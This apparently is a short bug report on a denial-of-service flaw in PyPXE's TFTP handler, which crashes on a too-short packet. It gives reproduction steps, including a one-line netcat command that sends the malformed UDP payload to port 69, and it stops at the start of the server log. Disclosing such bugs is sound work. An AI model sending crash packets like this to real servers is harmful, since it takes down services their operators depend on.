| A denied service bug exists in the `handle` function in the `tftp` module when parsing a packet of insufficient length. Reproduce1. Start the Server ``` python -m pypxe.server --tftp ``` 2. Attack Send a UDP packet with the following payload:  ``` echo -n "00" | xxd -r -p | nc -u 127.0.0.1 69 ```  Then, the server will crash and the logs are as follows:  ``` 2023-10-26 14:56:25,545 [INFO] PyPXE Starting TFTP server... 2023-10-26 14:56:25,545 [INFO] PyPXE PyPXE successfully initialized and running!
